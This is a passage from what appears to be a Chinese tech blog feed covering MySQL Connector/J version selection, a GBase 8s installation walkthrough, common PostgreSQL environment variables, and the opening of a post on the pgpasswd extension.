<p>对于 TLS v1.3，从 MySQL Connector/J 8.0.19 以及 MySQL 8.0.16 开始支持，需要注意的是，从 MySQL 8.0.18 开始，组复制支持 TLS v1.3。</p>
<p>对于 TLS v1.2，从 MySQL Connector/J 5.1.46 以及 MySQL 5.7.28/8.0.4 开始支持。</p>
<p>对于 TLSv1 和 TLSv1.1，从 MySQL Connector/J 8.0.26 开始被废弃，并从 MySQL Connector/J 8.0.28 被移除。</p>
<p>此外，还需注意，TLS 需要 Java 版本支持。如果你需要使用 TLS v1.3，那么需要搭配更高版本的 JDK 8，比如 Oracle Java 8u261。从 Java 11 开始，JDK 默认支持 TLSv1.3。</p>
<p>当然，也需要更新版本的 openssl，比如，当使用 TLS v1.3 时，需要 openssl 1.1.1。</p>
<h3 id="5-特性支持">5. 特性支持</h3>
<p>MySQL Connector/J 的不同版本提供了不同的特性和支持。例如，MySQL Connector/J 8.x 版本提供了对 MySQL 8.0 新特性的支持，如窗口函数、公共表表达式（CTE）、角色权限等。此外，新版本还包含性能改进、错误修复和安全更新。</p>
<h3 id="6-生命周期">6. 生命周期</h3>
<p>对于 MySQL Server 而言，由于发版模型发生了变化，MySQL 8.0 已不再追加新特性，目前已经发布了 MySQL 8.1.0，8.2.0 和 8.3.0 三个创新版本（Innovation Release），期待 MySQL 8.4.0 LTS 的到来。</p>
<p>不过，MySQL Connector/J 并不遵循此发版模型，而是继承、延续为 8.x 系列 GA 版本。</p>
<p>MySQL Connector/J 8.1 取代了 8.0 系列，最后一个 8.0 系列的版本为 8.0.33。</p>
<h2 id="总结">总结</h2>
<p>建议使用最新版本的 MySQL Connector/J，以获得更好的安全性和兼容性。</p>
<p>目前，推荐使用 MySQL Connector/J 8.3.0。</p>
<h2 id="附">附</h2>
<ul>
<li>Maven 配置为：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mysql&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.3.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Gradle 配置为：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">implementation group: &#x27;com.mysql&#x27;, name: &#x27;mysql-connector-j&#x27;, version: &#x27;8.3.0&#x27;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>官方下载地址：<a class="link"   href="https://dev.mysql.com/downloads/connector/j/" >https://dev.mysql.com/downloads/connector/j/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>墨天轮下载地址：<a class="link"   href="https://www.modb.pro/doc/125743" >https://www.modb.pro/doc/125743 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>jdbc</tag>
        <tag>connector</tag>
      </tags>
  </entry>
  <entry>
    <title>如何快速安装、使用 GBase 8s 数据库</title>
    <url>/2024/gbase/gbase-8s-v8-install/</url>
    <content><![CDATA[<h2 id="0-GBase-8s-介绍">0. GBase 8s 介绍</h2>
<p>GBase 8s 是天津南大通用数据技术股份有限公司自主研发、支持共享存储集群、两地三中心部署的、成熟稳定的百T金融级事务型国产数据库，拥有自主知识产权。支持集中式部署、共享存储高可用部署、支持两地三中心高可用部署，具备高容量、高并发、高性能等特性。</p>
<p>GBase 8s 适用于 OLTP 应用场景，包括金融、电信行业的关键核心业务系统，安全、党政、国防等行业对信息安全性有较高要求的信息系统，以及大型企业的经营类、管理类信息系统。能够提供 7*24 小时不间断运行处理能力，在 80% 以上场景中可以替代国际主流数据库。</p>
<h2 id="1-安装-GBase-8s">1. 安装 GBase 8s</h2>
<p>本文主要介绍 GBase 8s V8.8（兼容Oracle）产品的单机安装及基础用法。</p>
<p>从 GBase 官网下载 GBase 8s V8.8（兼容Oracle）安装包，本文使用的是 CentOS 7.9 系统，所以这里选择【GBase8sV8.8_TL_3.5.1_x86.7z】安装包。</p>
<p>安装包下载地址为：<a class="link"   href="https://www.gbase.cn/download/gbase-8s-1?category=INSTALL_PACKAGE" >https://www.gbase.cn/download/gbase-8s-1?category=INSTALL_PACKAGE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>提示：这里需要安装 <code>p7zip</code> 依赖，用来解压安装包。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y p7zip</span><br><span class="line">7za e GBase8sV8.8_TL_3.5.1_x86.7z</span><br></pre></td></tr></table></figure></div>
<p>解压完成后，输出如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan gbase]# ls</span><br><span class="line">clientsdk_3.5.1_x86.tar  GBase8sV8.8_TL_3.5.1_x86.7z  GBase8sV8.8_TL_3.5.1_x86.tar  GBaseInit_gbasedbt.sh</span><br></pre></td></tr></table></figure></div>
<p>继续解压【GBase8sV8.8_TL_3.5.1_x86.tar】：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan gbase]# tar xvf GBase8sV8.8_TL_3.5.1_x86.tar</span><br><span class="line">ids_install</span><br><span class="line">onsecurity</span><br><span class="line">doc/</span><br><span class="line">doc/ids_machine_notes_12.10.txt</span><br><span class="line">doc/ids_unix_relnotes_12.10.html</span><br><span class="line">ids.properties</span><br><span class="line">.gbase.properties</span><br></pre></td></tr></table></figure></div>
<p>创建 <code>gbasedbt</code> 用户。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">groupadd gbasedbt</span><br><span class="line">useradd -g gbasedbt gbasedbt</span><br></pre></td></tr></table></figure></div>
<p>创建安装目录，并授权。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -pv /opt/GBASE/gbase</span><br><span class="line">chown gbasedbt:gbasedbt -R /opt/GBASE</span><br></pre></td></tr></table></figure></div>
<p>GBase 8s 一般有三种安装方式：</p>
<ol>
<li>swing 图形化安装</li>
<li>console 控制台安装</li>
<li>silent 静默化安装</li>
</ol>
<p>除此之外，还可以选择使用“GEM安装配置管理平台”进行安装。</p>
<p>这里使用 console 控制台方式进行安装 GBase 8s。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan gbase]# ./ids_install </span><br><span class="line">...</span><br><span class="line">===============================================================================</span><br><span class="line">GBase Software Bundle                            (created with InstallAnywhere)</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Preparing CONSOLE Mode Installation...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">DO YOU ACCEPT THE TERMS OF THIS LICENSE AGREEMENT? (Y/N): Y</span><br><span class="line">...</span><br><span class="line">  Default Install Folder: /opt/GBASE/gbase</span><br><span class="line">...</span><br><span class="line">-- 约 5 分钟</span><br><span class="line">...</span><br><span class="line">Installation Complete</span><br><span class="line">---------------------</span><br><span class="line"></span><br><span class="line">Congratulations! GBase Software Bundle installation is complete.</span><br><span class="line"></span><br><span class="line">Product install status:</span><br><span class="line">GBase: Successful</span><br><span class="line">GBase Connect: Successful</span><br><span class="line"></span><br><span class="line">GBase 8s V8.8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">For more information about using GBase products, see the GBase Information </span><br><span class="line">Center at http://www.gbase.cn.</span><br></pre></td></tr></table></figure></div>
<p>设定环境变量。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan gbase]# cd /opt/GBASE/gbase</span><br><span class="line">[root@shawnyan gbase]# cat ol_gbasedbt1210.ksh &gt;&gt; /home/gbasedbt/.bash_profile </span><br><span class="line">[root@shawnyan gbase]# su - gbasedbt</span><br><span class="line">[gbasedbt@shawnyan ~]$ env | grep GBASEDB</span><br><span class="line">GBASEDBTSQLHOSTS=/opt/GBASE/gbase/etc/sqlhosts.gbaseserver</span><br><span class="line">GBASEDBTSERVER=gbaseserver</span><br><span class="line">GBASEDBTDIR=/opt/GBASE/gbase</span><br></pre></td></tr></table></figure></div>
<p>安装完成后，服务已经启动。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# ps auxf | grep oninit | grep -v grep</span><br><span class="line">gbasedbt  25086  0.0  1.6 358012 131144 ?       S&lt;   12:06   0:00 /opt/GBASE/gbase/bin/oninit -ivwy</span><br><span class="line">root      25087  0.0  0.0 358012  5100 ?        S&lt;   12:06   0:00  \_ /opt/GBASE/gbase/bin/oninit -ivwy</span><br><span class="line">root      25088  0.0  0.0 358012  4456 ?        S&lt;   12:06   0:00      \_ /opt/GBASE/gbase/bin/oninit -ivwy</span><br><span class="line">root      25089  0.0  0.0 358012  4448 ?        S&lt;   12:06   0:00      \_ /opt/GBASE/gbase/bin/oninit -ivwy</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h2 id="2-GBase-8s-管理命令">2. GBase 8s 管理命令</h2>
<p>启动服务。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbasedbt@shawnyan ~]$ oninit -vy</span><br><span class="line">Reading configuration file &#x27;/opt/GBASE/gbase/etc/onconfig.ol_gbasedbt1210&#x27;...succeeded</span><br><span class="line">...</span><br><span class="line">Verbose output complete: mode = 5</span><br></pre></td></tr></table></figure></div>
<p>停止服务。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbasedbt@shawnyan ~]$ onmode -ky</span><br><span class="line">Your evaluation license will expire on 2025-02-20 00:00:00</span><br></pre></td></tr></table></figure></div>
<p>查看版本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbasedbt@shawnyan ~]$ gstat -version</span><br><span class="line">GBase 8s V8.8</span><br></pre></td></tr></table></figure></div>
<p>查看状态和启动时间。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbasedbt@shawnyan ~]$ onstat -</span><br><span class="line">Your evaluation license will expire on 2025-02-20 00:00:00</span><br><span class="line">On-Line -- Up 03:26:35 -- 175748 Kbytes</span><br></pre></td></tr></table></figure></div>
<h2 id="3-GBase-8s-创建实例">3. GBase 8s 创建实例</h2>
<p>创建实例，这里依据提示选择默认值。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbasedbt@shawnyan gbase]$ cd etc/</span><br><span class="line">[gbasedbt@shawnyan etc]$ ./GBaseInit_gbasedbt.sh </span><br><span class="line">...</span><br><span class="line">INSTANCE SUMMARY:</span><br><span class="line">  Instance name:               gbaseserver</span><br><span class="line">  GBase install directory:     /opt/GBASE/gbase</span><br><span class="line">  IP address &amp; port:           192.168.8.161:9088</span><br><span class="line">  Character set:               en_US.819</span><br><span class="line">  Logical log space size:      840 MB</span><br><span class="line">  Physical log space size:     840 MB</span><br><span class="line">  Smart LOB space size:        198 MB</span><br><span class="line">  Temp DBSpace size:           198 MB</span><br><span class="line">  Data path:                   /opt/GBASE/gbase/gbaseserver_dbs</span><br><span class="line">  Data path free size:         8408 MB</span><br><span class="line">...</span><br><span class="line">Creating database: gbasedb...OK</span><br><span class="line"></span><br><span class="line">Now you can use this URL to connect to gbasedb:</span><br><span class="line">jdbc:gbasedbt-sqli://192.168.8.161:9088/gbasedb:GBASEDBTSERVER=gbaseserver;</span><br><span class="line"></span><br><span class="line">Version:</span><br><span class="line">Your evaluation license will expire on 2025-02-20 00:00:00</span><br><span class="line">On-Line -- Up 00:00:16 -- 4275148 Kbytes</span><br><span class="line">Build Number:		3.5.1_3_6a4e30</span><br><span class="line"></span><br><span class="line">GBase Initializing Finished!</span><br></pre></td></tr></table></figure></div>
<h2 id="4-连接到-GBase-8s-数据库">4. 连接到 GBase 8s 数据库</h2>
<p><code>dbaccess</code> 是 GBase 8s 数据库的一个命令行客户端工具，用来与 GBase 8s 数据库服务器进行交互。</p>
<p>提示，这里可以安装 <code>rlwrap</code> 工具以提供历史记录和补全功能。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y rlwrap</span><br><span class="line">alias dbaccess=&#x27;rlwrap dbaccess&#x27;</span><br></pre></td></tr></table></figure></div>
<p>使用 <code>dbaccess</code> 连接数据库，并查看数据库版本信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbasedbt@shawnyan bin]$ dbaccess - -</span><br><span class="line">Your evaluation license will expire on 2025-02-20 00:00:00</span><br><span class="line">&gt; select dbinfo(&#x27;version_gbase&#x27;,&#x27;full&#x27;) from dual;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(constant)                    </span><br><span class="line"></span><br><span class="line">GBase8sV8.8_TL_3.5.1_3_6a4e30</span><br><span class="line"></span><br><span class="line">1 row(s) retrieved.</span><br></pre></td></tr></table></figure></div>
<h2 id="5-切换到-Oracle-兼容模式">5. 切换到 Oracle 兼容模式</h2>
<p>命令行工具切换到 Oracle 兼容模式。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set environment sqlmode &#x27;oracle&#x27;;</span><br></pre></td></tr></table></figure></div>
<p>使用 JDBC 连接到 GBase 8s 时，需要在连接串增加 <code>sqlmode=oracle</code> 选项来开启 Oracle 兼容模式。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:gbasedbt-sqli://192.168.8.161:9088/gbasedb:GBASEDBTSERVER=gbaseserver;sqlmode=oracle</span><br></pre></td></tr></table></figure></div>
<h2 id="6-简单的-CRUD-示例">6. 简单的 CRUD 示例</h2>
<p>切换到新创建的 <code>gbasedb</code> 数据库。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; database gbasedb;</span><br><span class="line"></span><br><span class="line">Database selected.</span><br></pre></td></tr></table></figure></div>
<p>创建一张表，并进行数据插入和查询。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; create table t1 (id int, user varchar(50));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">&gt; insert into t1 values (1,&#x27;shawnyan&#x27;);</span><br><span class="line"></span><br><span class="line">1 row(s) inserted.</span><br><span class="line"></span><br><span class="line">&gt; select * from t1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         id user                                               </span><br><span class="line"></span><br><span class="line">          1 shawnyan                                          </span><br><span class="line"></span><br><span class="line">1 row(s) retrieved.</span><br></pre></td></tr></table></figure></div>
<p>到此，GBase 8s 基础安装及功能演示告一段落。</p>
<hr>
<p>如果想更深入地了解 GBase 8s，欢迎关注<a class="link"   href="https://www.gbase.cn/training-activities/17" >GBase 8s 认证培训 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8s</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>南大通用</tag>
        <tag>gbase 8s</tag>
      </tags>
  </entry>
  <entry>
    <title>PG Style! 盘点几个常用的 Postgres 环境变量</title>
    <url>/2024/postgresql/pg-env-vars/</url>
    <content><![CDATA[<p>PostgreSQL 是一个功能强大的开源对象关系数据库系统，它使用并扩展了 SQL 语言，并结合了许多功能，可以安全地存储和扩展最复杂的数据工作负载。PostgreSQL 的起源可以追溯到 1986 年，作为加州大学伯克利分校 POSTGRES 项目的一部分，并且在核心平台上拥有超过 35 年的积极开发经验。PostgreSQL 因其经过验证的架构、可靠性、数据完整性、强大的功能集、可扩展性以及软件背后的开源社区始终如一地提供高性能和创新解决方案的奉献精神而赢得了良好的声誉。PostgreSQL 可在所有主要操作系统上运行，自 2001 年以来一直符合 ACID 标准，并具有强大的附加组件，例如流行的 PostGIS 地理空间数据库扩展器。毫不奇怪，PostgreSQL 已成为许多人和组织选择的开源关系数据库。</p>
<p>PostgreSQL 除了其强大的功能外，还支持许多环境变量，这些环境变量可以通过在命令行中设置或在启动脚本中设置来使用，以控制其行为。了解这些环境变量可以帮助 DBA 更好地管理 PostgreSQL 数据库。</p>
<p>接下来，我们来介绍几个常用的Postgres环境变量。</p>
<h2 id="1-PGHOST">1. PGHOST</h2>
<p>指定 PostgreSQL 服务器的主机名或 IP 地址。它通常用于客户端工具，如psql，以指定要连接的数据库服务器的位置。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan ~]$ export PGHOST=192.168.8.151</span><br><span class="line">[postgres@shawnyan ~]$ psql</span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(postgres@192) [postgres] 10:19:34# \conninfo</span><br><span class="line">You are connected to database &quot;postgres&quot; as user &quot;postgres&quot; on host &quot;192.168.8.151&quot; at port &quot;5432&quot;.</span><br></pre></td></tr></table></figure></div>
<h2 id="2-PGPORT">2. PGPORT</h2>
<p>指定 PostgreSQL 服务器的端口号。默认端口为5432，但是如果我们将其更改为其他端口，可以在PGPORT环境变量中指定相应的端口号。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan ~]$ export PGPORT=6666</span><br><span class="line">[postgres@shawnyan ~]$ psql</span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(postgres@192) [postgres] 10:21:30# \conninfo</span><br><span class="line">You are connected to database &quot;postgres&quot; as user &quot;postgres&quot; on host &quot;192.168.8.151&quot; at port &quot;6666&quot;.</span><br></pre></td></tr></table></figure></div>
<h2 id="3-PGDATABASE">3. PGDATABASE</h2>
<p>指定连接到的数据库名称。例如，我们可以设置PGDATABASE为&quot;shawnyan&quot;，表示连接到名为&quot;shawnyan&quot;的数据库。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan ~]$ export PGDATABASE=shawnyan</span><br><span class="line">[postgres@shawnyan ~]$ psql</span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(postgres@192) [shawnyan] 10:22:30# \conninfo</span><br><span class="line">You are connected to database &quot;shawnyan&quot; as user &quot;postgres&quot; on host &quot;192.168.8.151&quot; at port &quot;6666&quot;.</span><br></pre></td></tr></table></figure></div>
<h2 id="4-PGUSER">4. PGUSER</h2>
<p>指定连接到 PostgreSQL 的用户名。例如，我们可以设置PGUSER为&quot;shawnyan&quot;，表示使用&quot;shawnyan&quot;用户连接到PostgreSQL。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan ~]$ export PGUSER=shawnyan</span><br><span class="line">[postgres@shawnyan ~]$ psql</span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(shawnyan@192) [shawnyan] 10:26:41# \conninfo</span><br><span class="line">You are connected to database &quot;shawnyan&quot; as user &quot;shawnyan&quot; on host &quot;192.168.8.151&quot; at port &quot;6666&quot;.</span><br></pre></td></tr></table></figure></div>
<h2 id="5-PGPASSWORD">5. PGPASSWORD</h2>
<p>指定连接到 PostgreSQL 的密码。出于安全考虑，建议仅在脚本或命令行中临时使用此环境变量，而不是在配置文件或脚本中硬编码密码。例如，我们可以设置PGPASSWORD为&quot;shawnyan&quot;，表示使用&quot;shawnyan&quot;密码连接到PostgreSQL。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan data]$ psql</span><br><span class="line">Password for user shawnyan: </span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(shawnyan@192) [shawnyan] 10:29:18# \q</span><br><span class="line">[postgres@shawnyan data]$ export PGPASSWORD=shawnyan</span><br><span class="line">[postgres@shawnyan data]$ psql</span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(shawnyan@192) [shawnyan] 10:29:28# \conninfo</span><br><span class="line">You are connected to database &quot;shawnyan&quot; as user &quot;shawnyan&quot; on host &quot;192.168.8.151&quot; at port &quot;6666&quot;.</span><br></pre></td></tr></table></figure></div>
<h2 id="6-PGDATA">6. PGDATA</h2>
<p>指定 PostgreSQL 数据库的数据目录。例如，我们可以设置PGDATA为/var/lib/pgsql/15/data，如此在使用pg_ctl命令时，无需再次指定-D数据目录。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan data]$ unset PGDATA</span><br><span class="line">[postgres@shawnyan data]$ pg_ctl restart</span><br><span class="line">pg_ctl: no database directory specified and environment variable PGDATA unset</span><br><span class="line">Try &quot;pg_ctl --help&quot; for more information.</span><br><span class="line">[postgres@shawnyan data]$ pg_ctl restart -D /var/lib/pgsql/15/data</span><br><span class="line">waiting for server to shut down.... done</span><br><span class="line">server stopped</span><br><span class="line">waiting for server to start....2024-02-17 10:31:02.876 CST [17844] LOG:  redirecting log output to logging collector process</span><br><span class="line">2024-02-17 10:31:02.876 CST [17844] HINT:  Future log output will appear in directory &quot;log&quot;.</span><br><span class="line"> done</span><br><span class="line">server started</span><br><span class="line">[postgres@shawnyan data]$ export PGDATA=/var/lib/pgsql/15/data</span><br><span class="line">[postgres@shawnyan data]$ pg_ctl restart</span><br><span class="line">waiting for server to shut down.... done</span><br><span class="line">server stopped</span><br><span class="line">waiting for server to start....2024-02-17 10:31:18.632 CST [17866] LOG:  redirecting log output to logging collector process</span><br><span class="line">2024-02-17 10:31:18.632 CST [17866] HINT:  Future log output will appear in directory &quot;log&quot;.</span><br><span class="line"> done</span><br><span class="line">server started</span><br></pre></td></tr></table></figure></div>
<h2 id="7-PGCLIENTENCODING">7. PGCLIENTENCODING</h2>
<p>指定客户端编码。如果不指定，则默认选择服务器设定。例如，如果我们想使用UTF-8编码，可以将PGCLIENTENCODING设置为&quot;UTF8&quot;。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan log]$ export PGCLIENTENCODING=EUC_TW</span><br><span class="line">[postgres@shawnyan log]$ psql</span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(shawnyan@192) [shawnyan] 10:52:24# show client_encoding ;</span><br><span class="line"> client_encoding </span><br><span class="line">-----------------</span><br><span class="line"> EUC_TW</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<h2 id="8-PGOPTIONS">8. PGOPTIONS</h2>
<p>指定自定义设置选项。例如，运行回归测试套件时使用的自定义服务器设置可以在 PGOPTIONS 环境变量中设置。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">make check PGOPTIONS=&quot;-c debug_parallel_query=regress -c work_mem=50MB&quot;</span><br></pre></td></tr></table></figure></div>
<p>再如，可以在启用新客户端会话时加入变量设置。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan ~]$ env PGOPTIONS=&quot;-c statement_timeout=10s&quot; psql</span><br><span class="line">psql (15.2)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(shawnyan@192) [shawnyan] 10:59:47# select pg_sleep(15);</span><br><span class="line">ERROR:  canceling statement due to statement timeout</span><br></pre></td></tr></table></figure></div>
<h2 id="9-PGDATESTYLE">9. PGDATESTYLE</h2>
<p>指定服务器端或客户端的日期格式环境变量，也可以使用PGTZ来改变日期显示的时区。例如，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[postgres@shawnyan ~]$ psql -c &#x27;select now()&#x27;</span><br><span class="line">              now              </span><br><span class="line">-------------------------------</span><br><span class="line"> 2024-02-17 11:12:58.144437+08</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">[postgres@shawnyan ~]$ export PGDATESTYLE=&#x27;Postgres, MDY&#x27;</span><br><span class="line">[postgres@shawnyan ~]$ psql -c &#x27;select now()&#x27;</span><br><span class="line">                 now                 </span><br><span class="line">-------------------------------------</span><br><span class="line"> Sat Feb 17 11:13:03.115172 2024 CST</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">[postgres@shawnyan ~]$ export PGTZ=&#x27;PST8PDT&#x27;</span><br><span class="line">[postgres@shawnyan ~]$ psql -c &#x27;select now()&#x27;</span><br><span class="line">                 now                 </span><br><span class="line">-------------------------------------</span><br><span class="line"> Fri Feb 16 19:13:12.459388 2024 PST</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<p>类似地，还有其他一些不太常用的环境变量，如：PGLOCALEDIR，PGSSLMODE，PGCONNECT_TIMEOUT，PGAPPNAME，PG_OOM_ADJUST_FILE，PG_OOM_ADJUST_VALUE，PG_REGRESS_DIFF_OPTS，这里不再一一介绍。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>PostgreSQL</category>
      </categories>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PG 扩展推荐：pgpasswd &amp; PG 密碼長度</title>
    <url>/2024/postgresql/pg-extension-pgpasswd/</url>
    <content><![CDATA[<h2 id="导语">导语</h2>
<p>PostgreSQL 用户密码的设定通常有两种。</p>
<p>一是创建用户时直接指定用户密码。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">create user shawnyan password <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>二是创建用户后更新用户密码。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">alter user shawnyan password <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>PostgreSQL 将用户信息存储在系统表 <code>pg_catalog.pg_authid</code> 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">select rolname as user, left(rolpassword,<span class="number">20</span>) as passwd</span><br><span class="line">from pg_catalog.pg_authid</span><br><span class="line">where rolname = <span class="string">&#x27;shawnyan&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">   user   |        passwd</span><br><span class="line">----------+----------------------</span><br><span class="line"> shawnyan | SCRAM-SHA<span class="number">-256</span>$<span class="number">4096</span>:E</span><br><span class="line">(<span class="number">1</span> row)</span><br></pre></td></tr></table></figure></div>
<p>接下来将基于 PostgreSQL 16.2 介绍扩展 <code>pgpasswd</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">postgres=<span class="meta"># select version();</span></span><br><span class="line">                                                      version</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL <span class="number">16.2</span>-ShawnYan on x86_64-pc-linux-gnu, compiled by gcc (GCC) <span class="number">11.4</span><span class="number">.1</span> <span class="number">20230605</span> (Red Hat <span class="number">11.4</span><span class="number">.1</span><span class="number">-2</span>), <span class="number">64</span>-bit</span><br><span class="line">(<span class="number">1</span> row)</span><br></pre></td></tr></table></figure></div>
<h2 id="pgpasswd">pgpasswd</h2>
